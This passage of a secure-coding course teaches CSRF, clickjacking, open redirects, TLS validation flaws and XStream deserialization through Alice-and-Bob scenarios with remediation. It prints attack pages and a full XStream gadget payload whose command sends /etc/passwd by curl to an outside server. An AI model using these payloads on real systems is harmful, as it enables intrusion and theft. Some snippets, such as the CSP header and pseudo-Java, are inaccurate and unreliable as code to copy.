+Defending against CSRF attacks isn't as simple as defending against XSS attacks. A *Synchronizer Token Pattern* is required to defend against CSRF attacks. A synchronizer token is also referred to as *Anti-CSRF token*, *CSRF token*, *Challenge Token*, or *Nonce*.
+
+To be effective, *each response from the web server requires a random token to be generated*. This token is then inserted by the application as a hidden text into the sensitive form fields.
+
+By taking this approach, *the application can then check, whenever a user submits a form, that the token is both valid and correct*. This is a good strategy to protect against CSRF attacks because the attacker should never know this randomly generated value.
+
+It allows the application to answer a simple question: Was the form POSTed by the user legitimately created by the application or by an unknown third party? Is it valid or invalid?
+
+Note that wherever a *cryptographically secure pseudo-random number generation (pRNG)* is required, the wheel should not be re-invented. Correct use of *java.security.SecureRandom* is strongly preferred over custom random number generation code because the latter is extremely prone to developer error.
+
+.Remediation
+[source,html]
+----
+//
+// HTML codebehind for "Delete All" button
+//
+​
+<form action="/ideas/delete_all" method="post">
+  <input type="hidden" name="scope" value="all">
+  <button class="button redB" id="delete_button" style="margin: 5px;">Delete All</button>
+  <input type="hidden" name="csrf-token" value="uRARsEXKdVjX6iUnQkDcfHiNqvG">
+</form>
+----
+
+The most effective method to protect against CSRF attacks is by having the application dynamically insert a *random token value* within the *Delete All* form tag.
+
+Then, when the *Delete All* form is submitted by Alice, this random token value is checked by the TradeIDEA application, on the server side.
+
+Given that Bob's malicious web page cannot guess or know this value beforehand, his malicious POST request would fail, thereby preventing the CSRF attack against Alice
+
+This technique of programmatically inserting random token values in every web page is known as the *synchronizer token pattern* +
+The pattern implements the generating of random "challenge" tokens that are associated with the user's current session, which are then verified for the existence and correctness of this token on the server side.
+
+How does an additional unique token in the request body help the server mitigate CSRF?
+
+    * By ensuring that the request's body also has an element the attacker cannot possibly guess, as an additional way of ensuring a request came from the user who intended to make it. +
+    This prevents an attacker from filling in a form and having a user submit it for them, as a *token associated with a user's session will then be validated by the server*; since an attacker cannot guess this token, they cannot forge a form that would be accepted. In other words, an element in the form which is unique to the user would prevent the attacker from crafting a valid form, mitigating CSRF attacks.
+
+==== Cross Site Request Forgery (GET)
+
+*Cross-Site Request Forgery (CSRF)* is an application security vulnerability  that permits an attacker to force another logged-in user of the application to perform actions within that application without realising. The classic example is Bob and Alice both being logged-in users of an online banking application, and Bob tricks Alice into making a funds transfer to Bob's account with CSRF. Importantly, in CSRF attacks the attacker does not have a direct mechanism for seeing the application's response to the victim.
+
+The vulnerable application pane loads the TradeIDEAS2 application, an online platform that allows for creation and sharing of trading strategies.
+
+Alice who is an authorized trader of the TradeIDEAS2 system has opened the application in her web browser.
+
+As Alice, go ahead and create the following three trade ideas:
+
+    1. Trade TRV given Oil is up to $90
+    2. SELL SSW short if it goes over $30
+    3. AWW, NSD and TRE at an all time low - BUY
+
+The developers of TradeIDEAS2 have recently enabled a new *Delete All* feature that allows for bulk deletion of trade ideas. +
+Before we continue with the exercise, let's analyze this feature in more detail.
+
+[source,html]
+----
+//
+// HTML codebehind for "Delete All" button
+//
+​
+<a href="/ideas2/delete_all?scope=all" title="" class="button redB" id="delete_button"><span>Delete All</span></a>
+----
+
+The *Delete All* action is defined as an HTML `a` tag, which when clicked by Alice , submits a GET HTTP request to TradeIDEAS2 `/ideas2/delete_all` URL resource, passing the querystring `scope=all` as an argument.
+
+Bob is an attacker. He has recently discovered a CSRF vulnerability within the TradeIDEAS2 application. +
+To exploit this vulnerability, Bob first registers a domain called *fake-research2.codebashing.com* to host a malicious web page. +
+Let's quickly analyze the HTML source code for Bob's malicious website before proceeding with the CSRF attack.
+
+.Malicious code
+[source,html]
+----
+<html>
+    <body>
+        <p>We are experiencing some technical problems. Our website is expected to be back online shortly. We apologize for the inconvenience.</p>
+        <img src="https://tradeidea2.codebashing.com/ideas2/delete_all?scope=all" width="0" height="0" border="0">
+    </body>
+</html>
+----
+
+Browsing through Bob's malicious HTML, we notice that the web page is programmed to display a fake "Server Downtime" message, which an unsuspecting victim will notice as a genuine website issue
+
+Bob has also declared an `img` tag within his malicious web page *whose width height and border properties have been set to 0* thereby ensuring that the *img is not visible* once Alice has loaded Bob's malicious web page. Note that the image src is set to TradeIDEAS2 "Delete All" URL. +
+We will learn later in the exercise why this img tag is needed for Bob's CSRF attack to work.
+
+Bob then writes a malicious email to Alice, asking her to check out a new financial research portal.
+
+----
+Hi Alice,
+Check out this interesting financial research portal that my colleagues shared with me:
+
+    https://fake-research2.codebashing.com
+
+Kind Regards,
+Bob
+----
+
+Alice would normally ignore unsolicited emails, but because the information looks relevant to her, she decides to follow Bob's link to the website.
+
+Interesting, all of Alice's saved trade ideas have suddenly disappeared. But how did that happen? +
+Let's look at the source code of Bob's malicious website to find this out.
+
+When Bob's malicious web page is loaded by Alice, her browser will render the HTML markup of this web page including the hidden `img` tag.
+
+Notice that within Bob's malicious webapge, the `img` tag's src parameter is set to TradeIDEA's "Delete All" URL, which upon successfully loading tricks Alice's browser into generating an HTTP GET request to TradeIDEAS2 `/ideas/delete_all` resource.
+
+Given that Alice has already been authenticated to TradeIDEAS2, the Delete All action invoked by Bob's web page is seen as a legitimate request made by Alice , thus deleting all her saved trade ideas.
+
+It is a *bad practice* to implement *Update, Create, and Delete operations* that rely on user-supplied input - *via HTTP GET requests*. This is the example of *misuse of HTTP methods*.
+
+In case of TradeIDEAS2 application, the developers have wrongly assigned GET method to invoke the Delete All function. However, best practice suggests that GET method be only used for retrieving data, while POST, PUT, PATCH, and/or DELETE methods are used for all actions that modify application state.
+
+Many web development frameworks also enforce the use of correctly assigned HTTP methods by default. In general, for a framework-agnostic approach, the following model is in line with the best practice for CRUD operations in a database-centric application:
+
+    1. Use HTTP GET for Read operations (SQL SELECT)
+    2. Use HTTP PUT for Update operations (SQL UPDATE)
+    3. Use HTTP POST for Create operations (SQL INSERT)
+    4. Use HTTP DELETE for Delete operations (SQL DELETE)
+
+==== Click jacking
+
+*Clickjacking*, also known as a *"UI redress attack"*, is when an attacker uses multiple transparent or opaque layers to *trick a user into clicking on a button or link on another page* when they were intending to click on the the top level page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both.
+
+The vulnerable application pane loads the TraderDASH application. In this application developers introduced a "One-click Trade" functionality that allows a user to quickly buy and sell stocks with a single-click order execution.
+
+Alice is a trader and registered user of the application. +
+As Alice, go ahead and make some trades.
+
+Bob has access to the TraderDASH application, but he does not have access to Alice's stock portfolio. +
+Bob knows that if he can just get Alice to sell all her APPL stock, he will then be able to buy the same stock at a lower price.
+
+First, Bob registers a domain called *stocktips.codebashing.com* and configures it to point to his own web server. +
+On his web server, Bob hosts a malicious web page that contains genuine looking research reports for traders.
+
+Bob then writes a malicious email to Alice, asking her to check out some interesting research he found.
+
+----
+Hi Alice,
+
+Check out this interesting research that my teammate sent to me:
+
+https://stocktips.codebashing.com/
+
+Kind Regards,
+Bob
+----
+
+Alice would normally ignore unsolicited emails, but because the information looks relevant to her, she decides to open it. +
+Alice opens the website using the link provided: https://stocktips.codebashing.com +
+This web page seems to load a news report that is relevant to traders like Alice.
+
+Before we see the *Clickjacking* attack in action, let's first take a look at the source code of Bob's malicious web page.
+
+.Malicious code
+[source,html]
+----
+<html>
+<body>
+​
+<p>BarCharts is extremely confident about the long term trading of Oil! Oil hasnt has its breakout move yet so you can still get it at this low price level! The big volume increases from the past couple of days tells us that Oil is getting ready for its breakout move and this one could be huge !</p>
+​
+<p><strong>OIL has "Strong Buy" rating from BarChart Corp. See our full analysis by clicking the following link !</strong></p>
+​
+<button style="margin-left: 450px; margin-top: 36px;">RESEARCH REPORT</button>
+​
+<iframe id="evil_iframe" src="https://traderdash.codebashing.com" frameborder="1" style="opacity: 0"></iframe>
+​
+</body>
+</html>
+----
+
+Browsing through Bob's malicious HTML, we notice that the web page contains a `button` tag called "RESEARCH REPORT" which an unsuspecting victim must first click in order to access the research report.
+
+Bob has also declared an `iframe` within his malicious web page that loads https://traderdash.codebashing.com . Note that the `iframe` has been styled using the *CSS opacity: 0 parameter to ensure that the iframe is not visible* once Alice has loaded Bob's malicious web page.
+
+As you can see, the malicious website that Bob created looks harmless. +
+However, on the last step, we saw that the stock trading page of the TraderDASH application is being loaded in the `iframe` with `opacity: 0`. +
+As Alice was logged in with the application before she clicked Bob's link, `iframe` loads her stock trading page. +
+To understand the impact better, play with the slider at the bottom of the pane to *alter the opacity setting of the `iframe` and opacity of the TraderDASH website correspondingly*.
+
+Alice sees that the research report is not loading and decides to go back to the TraderDASH application: https://traderdash.codebashing.com/
+
+Notice that all the purchased APPL shares have now been unintentionally sold. +
+Alice didn't realize that when she clicked the RESEARCH REPORT button, *she was actually clicking the transparent SELL button* within the TraderDASH application. +
+On the next steps, we'll learn how these attacks can be prevented.
+
+====== REMEDIATION
+
+To combat *Clickjacking* attacks in modern browsers, a *Content-Security-Policy* header can be set to *prevent framing*, using *frame-ancestors directive* that specifies pages that may embed the current page. It has the following values:
+
+    * none is the same as DENY
+    * self is the same as SAMEORIGIN
+    * Source URI - enables the server administrator to specify scheme, host, and port of allowed parent pages. This directive permits usage of wildcards, e.g. https://*.codebashing.com.
+
+Additionally, for the majority of browsers, the *X-Frame-Options* response header can be set. This header indicates to the browser which other domains are allowed to frame the web page in the response:
+
+    * *DENY* prevents any sort of framing for the current page
+    * *SAMEORIGIN* allows only the current domain to frame pages from its own domain
+    * *ALLOW-FROM* allows a single domain URI which may frame the page. +
+    Unfortunately, this means that for multiple domains, the ALLOW-FROM header will require an implementation that would correctly set the header by the request's referrer header.
+
+----
+<IfModule mod_headers.so>
+​
+# Prevent Clickjacking using X-Frame-Options header
+​
+Header set X-Frame-Options "deny"
+​
+# Prevent Clickjacking using Content Security Policy (Not supported by all major browsers yet)
+​
+Header set Content-Security-Policy: frame-options 'deny'; # Chrome / Firefox
+​
+Header set X-Content-Security-Policy: frame-options 'deny'; # Internet Explorer
+​
+</IfModule>
+----
+
+To *prevent click jacking attacks*, the *Internet Engineering Task Force (IETF)* has released a number of *HTTP headers*, which when configured provide effective protection against Click Jacking attacks. In our example we have set these HTTP headers using the *`mod_header.so` module* which provides directives to control and insert HTTP request and response headers.
+
+Setting the `X-Frame-Options` response header to deny, instructs a user's browser to *prevent traderdash.codebashing.com from being loaded and rendered within an iframe*. +
+By adding this header within TraderDASH's webserver configuration we can prevent Bob from embedding traderdash.codebashing.com within his malicious web page.
+
+The `Content-Security-Policy` header is an additional method that can be effectively used to *disable traderdash.codebashing.com from being embedded within an iframe*. However, note that the support for Content-Security-Policy directive is limited and not supported by older browser versions. It is therefore *recommended* to enabled both *X-Frame-Options* and *Content-Security-Policy* headers within your web server configuration file.
+
+A Clickjacking attack is possible because...
+    * A vulnerable site allows malicious sites to open it in an iframe or using equivalent tags
+
+=== Unvalidated Redirects and Forwards
+
+==== Insecure URL Redirect
+
+*Unvalidated redirects and forwards* are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.
+
+The vulnerable application pane loads a single sign-on launch page, which users must click in order to access the Backoffice SSO authentication portal. +
+Alice who is an authorized user of TraderWORX web portal has loaded the SSO application in her web browser.
+
+Before we demonstrate how URL redirection attacks work, let's start by analyzing TraderWORX's HTML code, specifically the "Backoffice SSO Login" button.
+
+[source,html]
+----
+//
+// HTML codebehind for Backoffice SSO Login button
+//
+​
+<a class="button greyishB" href="/redirect?url=https://sso.codebashing.com">
+    <span>Backoffice SSO Login</span>
+</a>
+----
+
+The "Backoffice SSO Login" button is defined as an anchor link tag, which when clicked redirects users to the TraderWORX SSO Login web page.
+
+The `href` attribute specifies the TraderWORX SSO Login page destination link as:
+
+    redirect?url=https://sso.codebashing.com
+
+Note that the URL sso.codebashing.com is assigned to `url` parameter, which gets passed as a querystring to TraderWORX's redirect servlet.
+
+To recap, when Alice clicks the "Backoffice SSO Login" button, her browser sends the following HTTP GET request to TraderWorx portal:
+
+    https://tradeworx.codebashing.com/traderworx/redirect?url=https://sso.codebashing.com
+
+
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure URL redirects in Java
+//
+​
+public class RedirectServlet extends HttpServlet {
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException,
+    IOException {
+     String query = request.getQueryString();
+     if (query.contains(url)) {
+      String url = request.getParameter(url); //
+      response.sendRedirect(url);
+       }
+     }
+}
+----
+
+In the following code snippit, the `doGet()` method extracts the incoming URL querystring by invoking the `request.getQueryString()` method. +
+A check is then performed to test if the URL querystring contains a `url` parameter by calling `if (query.contains(url))` code block.
+
+If the `url` parameter exists, the `request.getParameter()` method is called to extract our url parameter value. +
+For Alice's request the url parameter is set to sso.codebashing.com
+
+Finally, the parameter value is passed to `response.sendRedirect()` method which redirects the client browser to that resource i.e sso.codebashing.com
+
+Bob who is a potential attacker also has access to TraderWORX website. However Bob does not have valid access credentials to login as an authorized user. Bob has tried to find SQL injections and other potential attacks but the developers have embedded strong input validation.
+
+First, Bob registers a domain called *evil.codebashing.com* and configures this domain to point to his own web server. He then configures his webserver to host a bogus login page by copying the original HTML design and layout of the TradeWORX's login web page hosted on sso.codebashing.com
+
+Bob then crafts a malicious email to Alice, asking her to check out a new feature in the TradeWORX portal.
+
+----
+Hi Alice,
+We have updated TraderWORX recently with additional features you may find useful. You can check these out by logging in with your credentials at
+
+    https://tradeworx.codebashing.com/traderworx/redirect?url=https://evil.codebashing.com
+
+Kind Regards,
+Bob
+----
+
+Generally Alice would ignore such emails, but because the URL appears to be a genuine URL for TraderWORX portal she decides to open it.
+
+If all went well, Alice should be redirected to Bob's fake TraderWORX login page hosted on evil.codebashing.com
+
+Should Alice attempt logging in with her credentials, she would be submitting her authentication credentials on to Bob's fake login web page, thereby compromising the security of her account, and leaving her exposed to account takeover.
+
+Let's now analyze how Bob exploited the URL redirect flaw on TradeWORX portal.
+
+.Malicious code
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure URL redirects in Java
+//
+​
+public class RedirectServlet extends HttpServlet {
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException,
+    IOException {
+     String query = request.getQueryString();
+     if (query.contains(url)) {
+      String url = request.getParameter(url); //'https://evil.codebashing.com'
+      response.sendRedirect(url);
+       }
+     }
+}
+----
+
+In this code, *no input validation is performed on the contents of the url parameter* to ensure `sendRedirect()` is only called if `url` argument is set to sso.codebashing.com
+
+Instead, the application logic simply trusts Bob's user supplied value of url parameter i.e evil.codebashing.com and passes it as an argument to `sendRedirect()`, subsequently redirecting Alice to Bob's malicious website.
+
+====== Remediation
+
+If an application relies on a user-supplied parameter to determine the target of a redirect, it is important to ensure this parameter is properly validated. Otherwise the application’s redirection logic can be abused in order to have legitimate users of the application redirected to malicious website(s) without their knowledge (which is the first stage of a successful phishing attack).
+
+*Correct input validation* in this context means *ensuring that the user supplied redirect-target is both relevant to the application*, and *authorized for the requesting user*.
+
+A more elegant and secure solution would be to use an index / look-up value, whereby the application is responsible for looking-up the correct URL Redirect target based on an index value supplied by the user – in essence preventing any user supplied URLs.
+
+Alternatively, *do not use redirects* within the application.
+
+Let's see how the above recommendations can be applied to our vulnerable example to remediate the URL redirect vulnerability.
+
+.Remediation
+[source,java]
+----
+//
+// The following is a code snippet illustrating the use of insecure URL redirects in Java
+//
+​
+public class RedirectServlet extends HttpServlet {
+  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException,
+    IOException {
+        String url = request.getParameter(url);
+            if(url != null && url.equals("https://sso.codebashing.com")) {
+                response.sendRedirect(url);
+                return;
+            }
+//     String query = request.getQueryString();
+//     if (query.contains(url)) {
+//      String url = request.getParameter(url);
+//      response.sendRedirect(url);
+//       }
+     }
+}
+----
+
+In our modified code example, we first call `request.getParameter()` method to extract Alice's `url` parameter value which is then assigned to the `url` variable.
+
+Finally, an additional input validation check is performed by calling Java's `equals()` method to ensure that the `url` parameter string returned by `request.getParameter()` matches the URL string https://sso.codebashing.com.
+
+Should the if condition test fail, the `doGet` method will halt execution and return, without passing the `url` parameter to `response.sendRedirect`
+
+What is the reason the insecure redirect (or insecure forward) vulnerability exists in the redirection functionality of an application?
+
+    * The user is redirected to an arbitrary URL from the user input
+
+=== Extra Modules
+
+==== Insecure TLS Validation
+
+Insecure TLS validation is a security vulnerability that permits an attacker to bypass SSL pinning.
+
+The vulnerable application pane loads the Business Intelligence application - a thick client application used for accessing the TradeWorx on-line brokerage system.
+
+After Alice connects to the TradeWorx system, she decides to check the status of the connection. +
+To view connection details, she clicks the Status button in the upper-right corner of her BI application.
+
+Let us analyze the connection status output: it appears that the TradeWorks system provided us with the *TLS certificate that is already expired*. +
+Look at the Not Valid After parameter: its value is set to Sunday, 27 August 2013 02:20:46 British Summer Time +
+But Alice was sure the developers have implemented some methods to ensure that the application checks for various TLS errors including expired certificate, revoked certificate, etc.
+
+Let us take a look at the code snippet to understand how the certificate validation is implemented at the code level.
+
+.Vulnerable code
+[source,java]
+----
+public bool testSecureConnectionTo(String aURL) throws Exception {
+   Collection SANs = null;
+   LinkedList<String> subjectAltList = new LinkedList();
+   URL destinationURL = new URL(aURL);
+   String wildcardSAN = "*.trade-ssl.com";
+   HttpsURLConnection conn = (HttpsURLConnection) destinationURL.openConnection();
+   conn.connect();
+   java.security.cert.Certificate[] certs = conn.getServerCertificates();
+   for (java.security.cert.Certificate cert : certs) {
+     if(cert instanceof X509Certificate) {
+       try{
+         boolean[] keyUsage = ((X509Certificate) cert).getKeyUsage();
+         if(!keyUsage[5]) {
+           SANs = ((X509Certificate) cert).getSubjectAlternativeNames();
+         if (SANs != null) {
+           Iterator<X509Certificate> it = SANs.iterator();
+           while (it.hasNext()){
+             List list = (List) it.next();
+             String domain = (String) list.get(1);
+             subjectAltList.add(domain);
+           }
+         } if (!subjectAltList.contains(wildcardSAN)){
+           return false;
+         }
+       } catch (CertificateExpiredException | CertificateNotYetValidException e) {
+         logger.log(e.getMessage());
+         }
+       }
+     }
+   }return true;
+ }
+----
+
+In our example the developers use the `java.security.cert` package to *validate peer certificates*.
+First, they call the `getServerCertificates()` method of the `HttpsURLConnection` class to receive the certificate from the server.
+
+And after that, they *check if this certificate is not self-signed*.
+`getKeyUsage()` method gets the information about the key contained in the certificate, and the next if check ensures the *certificate was signed by some Certification Authority*.
+
+And at the last step we check if the certificate contains Subject Alternative Names (SANs) by invoking the `getSubjectAlternativeNames()` method.
+
+The code then performs an if check to test if the wildcardSAN string value exists in the list of SANs of the certificate and is valid.
+
+As you can see, *no expiration checks are performed*. As a result, *an attacker can now use an expired certificate* and still pass through the TLS validation without being blocked.
+
+====== Remediation
+
+As with any user-supplied input, it is important to *ensure there is a context-specific input validation strategy* in place. For example, consider the case of a *TLS/SSL man-in-the-middle attack* that could abuse the incorrectly defined certificate validation logic.
+
+Let us see how the proper input validation pattern can be applied to our vulnerable example to *remediate the TLS validation bypass vulnerability*.
+
+.Remediation
+[source,java]
+----
+public bool testSecureConnectionTo(String aURL) throws Exception {
+   Collection SANs = null;
+   LinkedList<String> subjectAltList = new LinkedList();
+   URL destinationURL = new URL(aURL);
+   String wildcardSAN = "*.trade-ssl.com";
+   HttpsURLConnection conn = (HttpsURLConnection) destinationURL.openConnection();
+   conn.connect();
+   java.security.cert.Certificate[] certs = conn.getServerCertificates();
+   for (java.security.cert.Certificate cert : certs) {
+     if(cert instanceof X509Certificate) {
+       try{
+         boolean[] keyUsage = ((X509Certificate) cert).getKeyUsage();
+         if(!keyUsage[5]) {
+
+           ((X509Certificate)cert).checkValidity();
+           SANs = ((X509Certificate) cert).getSubjectAlternativeNames();
+         if (SANs != null) {
+           Iterator<X509Certificate> it = SANs.iterator();
+           while (it.hasNext()){
+             List list = (List) it.next();
+             String domain = (String) list.get(1);
+             subjectAltList.add(domain);
+           }
+         } if (!subjectAltList.contains(wildcardSAN)){
+           return false;
+         }
+       } catch (CertificateExpiredException | CertificateNotYetValidException e) {
+         logger.log(e.getMessage());
+         }
+       }
+     }
+   }return true;
+ }
+----
+
+In our modified code snippet we add the missing piece with the *validity check*.
+To quickly recap, we use the *java.security.cert* package to *validate peer certificates*.
+
+So after we *check that the certificate is not self-signed*, we do *check if this certificate is not expired* with the `checkValidity()` method.
+
+After that, we continue with the check that the certificate contains Subject Alternative Names, and the code then performs an if check to test if the `wildcardSAN` string value exists in the list of SANs of the certificate and is valid.
+
+Which protocol should be used for secure SSL/TLS connection?
+
+    * TLS 1.2 or higher +
+    *SSL2* and *SSL3* have *critical vulnerabilities* that allow an attacker to decipher the ciphertext. TLS 1.0 itself doesn't have critical vulnerabilities but in order to comply with some standards, *TLS 1.0 shouldn't be used*. TLS 1.2 has no known security vulnerabilities. In TLS 1.3, support of some obsolete and insecure features was removed.
+
+==== Insecure Object Deserialization
+
+*Insecure Object Deserialization* is a security vulnerability that permits an attacker to abuse application logic, deny service, or execute arbitrary code, *when an object is being deserialized*.
+
+Most programming languages including JAVA provide ways for users to serialize objects into the text or binary format that can be saved or transmitted through the network and then construct those objects back using the deserialization process. This is a very common coding practice.
+
+*Vulnerabilities arise when developers try to construct an object from an untrusted serialization stream*, and they assume that this stream is always correct.
+
+If the stream was corrupted, tampered with or replaced prior to deserialization, the deserialized objects may have an unexpected or illegal state.
+
+The *nastiest consequence* of insecure object deserialization is *Remote Code Execution (RCE)*.
+
+If you can make some server execute the remote command - then you have a foot in the doorway, and can do anything to this server:
+
+    * Upload and execute a backdoor.
+    * Use the server as a cryptocurrency miner.
+    * Use the server as a part of a botnet.
+
+In this lesson, the deserialization vulnerability in the *XStream library* will be explored. This library serializes objects to XML and deserializes them back again.
+
+As a malicious object, a specially designed *gadget* will be used , as gadget-based exploits are very popular "in the wild".
+
+The gadget is a series of self-constructing objects that are nested in a way that will eventually lead to *command execution via the deserialized object*. In other words, the attacker re-purposes towards malicious ends types that are already available on the deserialization host.
+
+Alice is a software developer for an online e-commerce platform ShopStor. The platform has an API for ShopStor partners to manage account details, track product stock levels, and process orders. +
+Alice needs to log in and add a new Account Manager for troubleshooting purposes.
+
+Help Alice to add the new Account Manager. +
+Log in as a test user with the provided credentials:
+
+    Email: testuser@shopstorpartner.com
+    Password: testpassword
+
+Copy and paste the details of the new Account Manager:
+
+    Name: Alice Cody
+    E-mail: alicecody@shopstor.com
+    Phone: 555-0690
+
+.Result
+[source,html]
+----
+<org.shopstor.trade.shops.AccountManager>
+    <AccManName>Alice Cody</AccManName>
+    <AccManEmail>alicecody@shopstor.com</AccManEmail>
+    <AccManPhone>555-0690</AccManPhone>
+</org.shopstor.trade.shops.AccountManager> 
+----
+
+Now let’s check how this interaction with the ShopStor API looks from the client-server perspective. +
+After Alice clicks ADD, a XML request that contains Account Manager details is sent to the ShopStor API. +
+On the API side, the following code runs to create a new Account Manager record using the data received from the *XML request*.
+
+Alice checks for the new Account Manager record to appear in partner's account at ShopStor, and it looks like everything works just fine.
+
+[source,java]
+----
+public class XStreamDeserializer {
+  public static AccountManager getAccountManager(HttpRequestServlet request) {
+    XStream xstream = new XStream();
+    try {
+      String accountManagerXML = IOUtils.toString(request.getReader());
+      AccountManager am = (AccountManager)xstream.fromXML(accountManagerXML);
+      return am;
+    }
+    catch ( /*..*/ ) {
+      /* Handle various XStream parsing exceptions */
+      return null;
+    }
+  }
+}
+----
+
+In our example the API is used to create a new Account Manager, which, inside the application, is implemented with the `AccountManager` class
+
+To implement the "Create new Account Manager" functionality, the `getAccountManager()` method inside the API extracts a POST request's body by invoking `request.getReader()` method, which is then converted to an XML (in the form of a String) with the `IOUtils.toString()` method and assigned to the `accountManagerXML`
+
+The *XStream serialization library* is then used to *deserialize the AccountManager object*. The XStream object's `fromXML()` method is called to deserialize an Account Manager object from an XML, using the `accountManagerXML` String variable as an XML input.
+
+Bob is a bug bounty hunter. He likes to earn additional money on the side by hunting for vulnerabilities.
+
+With the new API release, ShopStor looks interesting, they also offer rewards for responsibly disclosed vulnerabilities.
+
+In his discovery, Bob uses a *Proxy tool* to *intercept HTTP/S requests*, allowing him to also tamper with them and create malicious request payloads.
+
+Bob starts with the same action: he adds the new Account Manager. +
+He fills in the Account Manager details, clicks ADD, and goes to his *proxy tool* to check the *POST request* for any clues on potential vulnerabilities
+
+*Bob sees a XML that looks like a JAVA serialized object*. +
+Now that Bob knows the trading application is using serialized objects for communication, he knows he must check for an *insecure object deserialization vulnerability*.
+
+[source]
+----
+===> Request:
+POST /partners/018316/AccManList/New HTTP/1.1
+Host: https: //www.shopstor.com:8587
+Connection: keep-alive
+Content-Type: text/xml; charset=utf-8
+Content-Length: 268
+Body:
+<?xml version="1.0" encoding="utf-8"?>
+
+ <org.shopstor.trade.shops.AccountManager> 
+ <AccManName>Bob Hackeye</AccManName> 
+ <AccManEmail>bobhackeye@shopstor.com</AccManEmail> 
+ <AccManPhone>555-0692</AccManPhone> 
+ </org.shopstor.trade.shops.AccountManager> 
+
+
+<=== Response:
+----------Headers----------
+ HTTP/1.1 200 OK 
+ Date:San Jan 14 14 2018 17:29:04 GMT+0200 
+ Connection: close
+ Content-Type: text/xml; charset=utf-8
+ Content-Length: 0
+----
+
+Bob is going to create a *malicious gadget* where he *embeds a command that reads the content of the `/etc/passwd` file* from the ShopStor server and then sends it over HTTP to Bob's server to the port 4444.
+
+As we explained at the beginning of the lesson, the *gadget* is a *series of self-constructing objects* that are *nested in a way that will eventually lead to command execution via the deserialized object*.
+
+So, after XStream deserializes this malicious gadget, the following command will be executed on the server:
+
+    /bin/sh -c "cat /etc/passwd | tr '\\n' ' ' | curl -d @- 180.256.0.88:4444"
+
+.Malicious payload XML file
+[source,xml]
+----
+<map>
+ <entry>
+  <jdk.nashorn.internal.objects.NativeString>
+   <flags>0</flags>
+   <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
+    <dataHandler>
+     <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
+      <is class="javax.crypto.CipherInputStream">
+       <cipher class="javax.crypto.NullCipher">
+        <initialized>false</initialized>
+        <opmode>0</opmode>
+        <serviceIterator class="javax.imageio.spi.FilterIterator">
+         <iter class="javax.imageio.spi.FilterIterator">
+          <iter class="java.util.Collections$EmptyIterator" />
+          <next class="java.lang.ProcessBuilder">
+​
+            <!-- Malicious code -->
+            <command>
+                <string>/bin/sh </string>
+                <string>-c</string>
+                <string>cat /etc/passwd | tr '\\n' ' ' | curl -d @- 180.256.0.88:4444</string>
+            </command>
+                                
+           <redirectErrorStream>false</redirectErrorStream>
+          </next>
+         </iter>
+         <filter class="javax.imageio.ImageIO$ContainsFilter">
+          <method>
+           <class>java.lang.ProcessBuilder</class>
+           <name>start</name>
+           <parameter-types />
+          </method>
+          <name>foo</name>
+         </filter>
+         <next class="string">foo</next>
+        </serviceIterator>
+        <lock />
+       </cipher>
+       <input class="java.lang.ProcessBuilder$NullInputStream" />
+       <ibuffer />
+       <done>false</done>
+       <ostart>0</ostart>
+       <ofinish>0</ofinish>
+       <closed>false</closed>
+      </is>
+      <consumed>false</consumed>
+     </dataSource>
+     <transferFlavors />
+    </dataHandler>
+    <dataLen>0</dataLen>
+   </value>
+  </jdk.nashorn.internal.objects.NativeString>
+  <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString" />
+ </entry>
+ <entry>
+  <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString" />
+  <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString" />
+ </entry>
+</map>
+----
+
+Help Bob create the malicious payload. +
+Click ADD to paste the following strings into the code:
+
+[source,xml]
+----
+<command>
+<string>/bin/sh </string>
+<string>-c</string>
+<string>cat /etc/passwd | tr '\\n' ' ' | curl -d @- 180.256.0.88:4444</string>
+</command>
+----
+
+To make this demonstration even more visual, Bob uses *Netcat* utility to read from a network connection using TCP and to output the results of the exploited deserialization vulnerability to a console.
+
+On his internet-facing server at the IP address 180.256.0.88, *Bob opens a Netcat listener*.
+
+Bob checks his CLI window and sees there the content of the `/etc/passwd` file from the ShopStor server. +
+Bob is pleased: that looks like a great trophy! With this vulnerability, almost any arbitrary operating system command can be executed on the ShopStor's Web server.
+
+.Bob Netcat log
+----
+root@ip-180-256-0-88:/home/ubuntu#
+netcat -l 4444
+....
+--------------------------------------
+66eefc5a03c7
+Content-Disposition: form-data; name="file"; filename="passwd"
+Content-Type: application/octet-stream
+root:x:0:0:root:/root:/bin/bash 
+bin: x: 1: 1: bin: /bin: 
+daemon: x: 2: 2: daemom: /sbin:  
+adm: x: 3: 4: adm: /var/adm: 
+lp: x: 4: 7: lp: /var/spool / lpd:
+....
+----
+
+Let’s explore how this attack was made possible from the code perspective.
+
+.Vulnerable code
+[source,java]
+----
+public class XStreamDeserializer {
+  public static AccountManager getAccountManager(HttpRequestServlet request) {
+    XStream xstream = new XStream();
+    try {
+      String accountManagerXML = IOUtils.toString(request.getReader());
+      AccountManager am = (AccountManager)xstream.fromXML(accountManagerXML);
+      return am;
+    }
+    catch ( /*..*/ ) {
+      /* Handle various XStream parsing exceptions */
+      return null;
+    }
+  }
+}
+----
+
+To quickly recap, in the API, creation of the new Account Manager is implemented with the `AccountManager` class.
+
+Inside the API, the `getAccountManager()` method needs to extract a POST request's body first. It invokes `request.getReader()` method to read from the `HttpRequestServlet`.
+
+Then the `IOUtils.toString()` method converts the extracted POST body to an XML String and assigns it to the `accountManagerXML` string variable.
+
+Then the XStream object's `fromXML()` method is called to *deserialize* an Account Manager object from an XML. +
+In its default state, *an XStream object has access to any and all classes available to the code*; this may include classes that were not expected to be used by the developer, such as the ones utilized by the malicious gadget. By unpacking user input and deserializing an unexpected class, Bob was able to execute his code.
+
+====== Remediation
+
+Alice wants to know what she could do to prevent the issue occurring in the future. +
